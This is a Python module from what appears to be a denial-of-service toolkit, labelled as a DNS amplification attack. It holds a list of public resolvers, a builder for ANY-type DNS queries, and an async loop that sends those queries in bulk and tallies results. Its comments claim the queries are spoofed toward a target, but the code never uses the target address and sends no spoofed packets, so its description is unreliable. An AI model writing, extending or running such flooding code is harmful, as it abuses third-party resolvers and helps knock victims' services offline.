# language: Python 3.10+, file: Module/dns_amp.py
# *DNS amplification -- UDP query blast at public resolvers spoofed to target*
# entry: dns_worker(target_ip, rounds, domain)

import asyncio, random, socket, struct
from Module.state import stats, slock, stop

# public resolvers -- queries spoofed-src toward target
DNS_RESOLVERS = [
    "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
    "9.9.9.9", "208.67.222.222", "208.67.220.220",
    "64.6.64.6", "64.6.65.6", "185.228.168.9",
    "77.88.8.8", "77.88.8.1",
]

def _build_dns_query(domain: str) -> bytes:
    """Craft a minimal ANY-query DNS packet."""
    txid    = struct.pack(">H", random.randint(0, 65535))
    flags   = b"\x01\x00"  # standard query, recursion desired
    qdcount = b"\x00\x01"
    zeros   = b"\x00\x00" * 3
    labels  = b""
    for part in domain.rstrip(".").split("."):
        enc = part.encode()
        labels += bytes([len(enc)]) + enc
    labels += b"\x00"
    qtype   = b"\x00\xff"  # ANY
    qclass  = b"\x00\x01"  # IN
    return txid + flags + qdcount + zeros + labels + qtype + qclass

async def dns_worker(target_ip: str, rounds: int,
                     domain: str = "version.bind") -> None:
    """
    Non-blocking UDP sendto() toward a random resolver for each round.
    asyncio.sleep(0) yields control between iterations so other tasks
    don't starve on a tight loop.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False)
    pkt  = _build_dns_query(domain)
    loop = asyncio.get_event_loop()

    for _ in range(rounds):
        if stop[0]:
            break
        try:
            resolver = random.choice(DNS_RESOLVERS)
            await loop.sock_sendto(sock, pkt, (resolver, 53))
            with slock:
                stats["sent"]    += 1
                stats["success"] += 1
        except Exception:
            with slock:
                stats["sent"] += 1
                stats["fail"] += 1
        await asyncio.sleep(0)   # yield

    sock.close()
